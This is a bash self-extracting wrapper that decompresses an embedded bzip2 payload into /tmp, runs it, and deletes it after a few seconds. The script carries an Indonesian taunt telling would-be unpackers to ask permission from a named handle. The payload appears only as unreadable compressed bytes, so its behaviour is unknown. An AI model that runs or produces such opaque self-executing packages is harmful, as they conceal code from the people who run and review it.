#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY���  �߀@��'�*����Pso��P���mA�2h   2��2j      ڍ?�UP    �M0� D�4�4�Oj6��yOQ��@d44�@�i4�OI���� bh4�q�;�����o��x�Y�h�E�	`M�\pƣkV�Pc�T�[�@�8,��@��@�?$�      
|I�E��)�y� �yZg�}.�(�Y��X"�5o�P�#p�o7vQGt��hD d�APB�x��|��ko&�ͻm�YR�g5��~�����ꄎ<�� ��@�$$$$$$$$$$&�6AjV*x�#B�$$$$$&`F�����У�>n��Ͱ>�����#�G��#�xx��󙻡a�w]o��F�w�C����#,�g	��֋��IG�G���RAh �.JՂ
�b�T9���r4"
M�(�L[���1��F��{�l�I$���Gv��G!�6;�HHAhפF�� s:���5C��1R��<�=�z{�r��";�o)aw�����L��	:8A
�B-Dh��S�G�����P��		{��S�F���`f�#^#�Q��$-z�5���4�73ʣ��1�g#���9�B:�� �+t��� H|�yve�<4����fns#��4r�ݢ7:\���F����#�-�|cs`�����\�^�Q��$��=9�|�:�q$���:�.j�MI$�r:Dw�t?�{�Jm�V��ܑN$,��g@